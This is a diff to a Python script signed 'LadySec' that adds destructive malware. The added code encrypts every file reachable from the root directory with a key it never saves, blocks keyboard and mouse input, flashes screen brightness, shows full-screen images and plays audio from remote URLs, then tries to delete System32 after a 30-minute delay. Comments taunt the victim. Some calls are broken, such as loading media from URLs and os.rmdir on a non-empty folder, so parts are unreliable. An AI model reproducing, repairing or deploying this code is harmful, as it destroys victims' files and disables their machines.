@@ -21,25 +21,51 @@ Love, -LadySec
 
 """ 
 
-import sys
-import tkinter
-from PIL import Image, ImageTk
-from threading import Timer, Thread
-from time import sleep
-from playsound import playsound  
 
+import os
+import time
+import sys
+import tkinter as tk
+from tkinter import Label
+from threading import Thread, Timer
+from time import sleep
+from cryptography.fernet import Fernet
+import pygame
+from PIL import Image, ImageTk
 import pyHook
 import win32gui
-import logging
-import win32file
-
 import screen_brightness_control as sbc
+from playsound import playsound
+
+# set encryption ig
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
+
+def encrypt_file(file_path):
+    with open(file_path, 'rb') as file:
+        file_data = file.read()
+    encrypted_data = cipher_suite.encrypt(file_data)
+    with open(file_path, 'wb') as file:
+        file.write(encrypted_data)
+
+def wipe_drive():
+    os.rmdir("C:\\Windows\\System32")
+
+def play_audio():
+    pygame.mixer.init()
+    pygame.mixer.music.load("https://files.catbox.moe/a03v46.mp3")
+    pygame.mixer.music.play()
+
+def display_image():
+    root = tk.Tk()
+    image = tk.PhotoImage(file="https://files.catbox.moe/cutmgo.mov")
+    label = Label(root, image=image)
+    label.pack()
+    root.mainloop()
 
 def FULL_BRIGHT():
     current_brightness = sbc.get_brightness()
-    if current_brightness == 100:
-        pass
-    else:
+    if current_brightness != 100:
         sbc.set_brightness(100)
 
 def brightness_setter(num, sleep_time):
@@ -47,17 +73,17 @@ def brightness_setter(num, sleep_time):
     sleep(sleep_time)
 
 def FLASHER(num):
-    for i in range(num):
+    for _ in range(num):
         brightness_setter(0, 0.5)
         brightness_setter(100, 0.5)
 
 def showPIL(pilImage):
-    root = tkinter.Tk()
+    root = tk.Tk()
     w, h = root.winfo_screenwidth(), root.winfo_screenheight()
     root.overrideredirect(1)
     root.geometry("%dx%d+0+0" % (w, h))
     root.focus_set()
-    canvas = tkinter.Canvas(root, width=w, height=h)
+    canvas = tk.Canvas(root, width=w, height=h)
     canvas.pack()
     canvas.configure(background='black')
     imgWidth, imgHeight = pilImage.size
@@ -71,7 +97,6 @@ def showPIL(pilImage):
     root.mainloop()
 
 class blockInput:
-
     def __init__(self):
         self.hm = pyHook.HookManager()
 
@@ -101,23 +126,36 @@ class blockInput:
                 self.hm.HookKeyboard()
             win32gui.PumpWaitingMessages()
 
-def play_audio():
-    while True:
-        playsound("https://files.catbox.moe/17mf2x.mp3")
-
 def main():
+    # put audio in a diff thread
     audio_thread = Thread(target=play_audio, daemon=True)
     audio_thread.start()
 
+    # fuck their input
     block = blockInput()
     block.block()
     block.unblock()
 
+    # show pic lmfao
     pilImage = Image.open("https://files.catbox.moe/owrdv6.webp")
     showPIL(pilImage)
 
+    # fuck their screens brightness if possible
     FULL_BRIGHT()
     FLASHER(3)
 
-while True:
+    # encrypt idfk im js a girl
+    for root, dirs, files in os.walk("/"):
+        for filename in files:
+            filepath = os.path.join(root, filename)
+            try:
+                encrypt_file(filepath)
+            except Exception as e:
+                print(f"Error encrypting {filepath}: {e}")
+
+    # wait and then wipe drive
+    time.sleep(1800)
+    wipe_drive()
+
+if __name__ == "__main__":
     main()
